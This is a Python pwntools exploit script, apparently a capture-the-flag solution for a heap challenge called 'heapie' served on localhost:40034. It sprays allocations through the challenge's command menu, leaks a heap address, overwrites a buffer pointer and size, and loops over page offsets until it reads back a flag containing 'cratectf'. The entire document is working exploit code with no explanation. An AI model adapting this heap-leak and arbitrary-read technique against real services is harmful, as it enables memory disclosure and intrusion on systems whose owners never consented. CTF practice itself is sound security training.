#!/usr/bin/env nix
#!nix shell --impure --expr ``(import <nixpkgs> {}).python3.withPackages (p: [p.pwntools p.tqdm])`` -c python

from pwn import *
from sys import stdout
from tqdm import tqdm

# with process("./docker/heapie") as p:
for x in range(1000): # 28 seems to be the correct number, but doesn't hurt that much to try a few
    with remote("localhost", 40034) as p:
        # Calling `p.sendlineafter(b"> ", ...) instead of this `send` made this
        # script take around 5 minutes. With this it takes around 4 sec (when running locally).
        prompts = 0
        def send(b):
            global prompts
            p.sendline(b)
            prompts += 1
        def getprompts():
            global prompts
            while prompts > 0:
                p.recvuntil(b"> ")
                prompts -= 1
        for _ in tqdm(range(4096//16 - 1)):
            send(b"np")
            send(b"addr")
            send(b"16")
            send(b"rp")
            send(b"addr")
        send(b"np")
        send(b"addr")
        send(b"16")
        # print(p.recvline())
        send(b"rp")
        send(b"addr")
        send(b"cd")
        send(b"docu")
        send(b"1")
        send(b"addr")
        # print(p.recvline())
        send(b"gp")
        send(b"addr")
        getprompts()
        addr = u64(p.recv(8))
        print(hex(addr))
        send(b"sp")
        send(b"addr")
        send(p64(addr + 4096 * x) + p64(4096))
        send(b"gd")
        send(b"docu")
        getprompts()
        flag = p.recvline(False, 0.5)[3:]
        print(len(flag))
        if b"cratectf" in flag:
            print(flag.decode("utf-8"))
            raise SystemExit(0)
raise SystemExit(1)
